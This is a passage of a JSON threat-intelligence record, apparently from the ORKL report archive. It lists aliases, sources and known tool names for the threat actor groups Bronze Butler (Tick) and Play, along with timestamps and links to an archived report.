            "id": "d4e7cd9a-2290-4f89-a645-85b9a46d004b",
            "created_at": "2022-10-25T16:07:23.419513Z",
            "updated_at": "2025-03-27T02:02:09.790389Z",
            "deleted_at": null,
            "main_name": "Bronze Butler",
            "aliases": [
                "Bronze Butler",
                "CTG-2006",
                "Operation ENDTRADE",
                "RedBaldNight",
                "Stalker Panda",
                "Stalker Taurus",
                "TEMP.Tick",
                "Tick"
            ],
            "source_name": "ETDA:Bronze Butler",
            "tools": [
                "8.t Dropper",
                "8.t RTF exploit builder",
                "8t_dropper",
                "9002 RAT",
                "AngryRebel",
                "Blogspot",
                "Daserf",
                "Datper",
                "Elirks",
                "Farfli",
                "Gh0st RAT",
                "Ghost RAT",
                "HOMEUNIX",
                "HidraQ",
                "HomamDownloader",
                "Homux",
                "Hydraq",
                "Lilith",
                "Lilith RAT",
                "McRAT",
                "MdmBot",
                "Mimikatz",
                "Minzen",
                "Moudour",
                "Muirim",
                "Mydoor",
                "Nioupale",
                "PCRat",
                "POISONPLUG.SHADOW",
                "Roarur",
                "RoyalRoad",
                "ShadowPad Winnti",
                "ShadowWali",
                "ShadowWalker",
                "SymonLoader",
                "WCE",
                "Wali",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "XShellGhost",
                "XXMM",
                "gsecdump",
                "rarstar"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "bf0489c5-1c07-41e6-91c9-855ad96ccc6a",
            "created_at": "2022-10-25T16:47:55.541639Z",
            "updated_at": "2025-03-27T02:05:17.253496Z",
            "deleted_at": null,
            "main_name": "BRONZE BUTLER",
            "aliases": [
                "Daserf",
                "Stalker Panda ",
                "Tick ",
                "CTG-2006 "
            ],
            "source_name": "Secureworks:BRONZE BUTLER",
            "tools": [
                " DGet",
                " Daserf",
                " Datper",
                " Gofarer",
                " MSGet",
                " Mimikatz",
                " RarStar",
                " Screen Capture Tool",
                " ShadowPad",
                " T-SMB",
                " WinRAR",
                " Windows Credential Editor",
                " gsecdump",
                " xmm downloader",
                " xxmm",
                "ABK"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1666716499,
    "ts_updated_at": 1743041786,
    "ts_creation_date": 1543267550,
    "ts_modification_date": 1543267558,
    "files": {
        "pdf": "https://archive.orkl.eu/c10757263570d6941a5f0ca2b5b6923271b54eb8.pdf",
        "text": "https://archive.orkl.eu/c10757263570d6941a5f0ca2b5b6923271b54eb8.txt",
        "img": "https://archive.orkl.eu/c10757263570d6941a5f0ca2b5b6923271b54eb8.jpg"
    }
}